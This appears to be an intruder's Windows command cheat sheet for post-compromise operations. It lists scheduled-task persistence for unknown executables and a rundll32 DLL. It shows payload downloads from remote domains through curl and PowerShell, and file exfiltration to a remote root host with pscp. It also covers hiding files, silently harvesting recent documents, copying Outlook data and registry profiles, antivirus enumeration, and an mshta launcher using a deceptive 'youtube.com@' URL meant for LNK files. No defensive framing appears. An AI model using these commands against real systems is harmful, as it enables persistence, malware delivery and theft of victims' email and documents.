
@echo off
ssh-keygen -t rsa - (For initial local key gen don't generate if alreay exists)
ssh-copy-id -i ~/.ssh/id_rsa.pub -p1179 root@x.x.x.x.x
ssh root@x.x.x.x.x -p 1179 'du -h /home/data/' #Check data on remote PC with Size

sudo mount -t vboxsf -o uid=1000,gid=1000 Xray /media
sudo umount /media/sf_Xray

***********************************************************************************************************************************************************************
Schedule Task
***********************************************************************************************************************************************************************
schtasks /create /sc minute /mo 05 /f /tn  servicexr /tr "'%USERPROFILE%\a.exe'" 
schtasks /create /sc minute /mo 10 /f /tn alfsrv /tr "rundll32.exe '%USERPROFILE%\b.dll', jkrjkukjrkakj"
schtasks /delete /tn Service_Protection /f 
SCHTASKS /Run /TN "IOGlet"
schtasks /query /fo LIST /v 
schtasks /query /fo LIST /v | findstr "UlElef*"

***********************************************************************************************************************************************************************
File Upload & download 
***********************************************************************************************************************************************************************

curl.exe -k -o uope.exe https://ssm.bougainvillea.live/nui10euxids/115:34:50.17-WALTON-WALTON/

echo y | pscp.exe -pw xxxxxxx "%PUBLIC%\lient\sot\sot.txt" root@x.x.x.x:/home/
echo y | pscp.exe -P 1179 -pw xxxxx "%userprofile%\lient\sot\sot.txt" root@x.x.x.x:/home/
powershell -c "Invoke-WebRequest -Uri 'https://xxxxxxx.online/10njta3nrn1tain3ajn333p0l6nqpjnntn/ZyheO0dfrTmnkl4dmOxky' -OutFile '%PUBLIC%\abc.exe'"

using powershell

(New-Object Net.WebClient).DownloadFile('https://xxxxx.online/97FF149Cb1277g74C2Ag9C1g3bCF923d47/ZyheO0dfrTmnkl4dmOxky', 'abc.exe')

***********************************************************************************************************************************************************************
File Operations
***********************************************************************************************************************************************************************
md "%USERPROFILE%\b"
attrib +a +h +s "%USERPROFILE%\n"
attrib -H -S /D /S -- Remove hidden attribute of all file in current directory
del /ah abc.exe
rmdir "%PUBLIC%\Pictures\kkkk"
rmdir /Q /S ntn
copy %APPDATA%\..\Local\Microsoft\Outlook\ * "%userprofile%\a\b\b\" -- copy outlook
ROBOCOPY "E:\TRG SEC\79. ST-WT\WT 2022-2023" "C:\Users\av\noise\kali\toqu"  *.doc /s /MAXAGE:15
ROBOCOPY /MIR /NFL /NDL /NC /NS /NP "%userprofile%\Downloads" "%userprofile%\s\d\d"  *.doc /s /MAXAGE:7 >nul 2>&1 
[--RecycleBin--]
cd "C:\$Recycle.Bin"
dir /s /a
copy "C:\$Recycle.Bin\*" "newlocaiton"

***********************************************************************************************************************************************************************
Wmic Antivirus Task Archive
***********************************************************************************************************************************************************************
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get * /value
wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivirus installed
wmic logicaldisk get name -- get drive name
wmic logicaldisk get caption -- getname
wmic process where "Name = 'uope.exe'" get processID, ExecutablePath
taskkill /f /im io.dll
powershell Compress-Archive "%USERPROFILE%\sof\lia\ant\'PPT 7 Sep 2023'" "%USERPROFILE%\sof\lia\ant\PPT-7-Sep-2023.zip"

***********************************************************************************************************************************************************************
OutLook
***********************************************************************************************************************************************************************
copy %APPDATA%\..\Local\Microsoft\Outlook\ * "%userprofile%\vision\gh\sab\" 
reg export "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook" "outlook1.reg"
reg export "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook" "outlook1.reg"
copy %APPDATA%\..\Local\Microsoft\Outlook\ * "%userprofile%\vision\gh\sab\" 

***********************************************************************************************************************************************************************
Misc Commands
***********************************************************************************************************************************************************************
if exist "%userprofile%\g.exe" start /d "%userprofile%\a" gg.exe   -- run file with batch
C:\Windows\System32\mshta.exe https://youtube.com@mailmofagovnp.cvix.cc/3785/1/33387/2/0/0/0/m/files-4139804f/hta [ hta cmd in lnk file ]
// Block all ip

Promax
=========================
rundir C:\Users\"{agent}"\sof\lia\ant
rundir C:\Users\"{agent}"\sof\lia
rundir /ah C:\Users\Public\Music\sg







____________Get MS Office version______________
wmic product where "Name like '%Office%'" get name
___________________________________________________
